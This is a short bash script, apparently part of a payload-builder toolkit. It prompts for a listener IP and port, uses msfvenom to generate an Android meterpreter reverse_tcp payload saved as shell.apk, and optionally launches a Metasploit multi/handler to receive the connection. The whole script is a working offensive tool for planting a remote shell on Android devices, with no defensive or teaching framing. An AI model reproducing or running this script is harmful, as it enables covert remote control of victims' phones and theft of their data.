echo "Enter Listiner IP:"
read ip
echo "Enter Listiner PORT:"
read port
cd ..
cd output
echo "Please wait"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.apk
echo "**********************************"
echo "shell.apk created in output folder"
echo "**********************************"
cd ..
#TO START THE HANDLER
echo "Do you want to start listner now?(1-Yes/ 2-No)"
read op
case $op in 
	1)
	msfconsole -q -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run" ;; 
	2)
	bash easypayload.sh ;;
	*)echo "Wrong option! "
esac
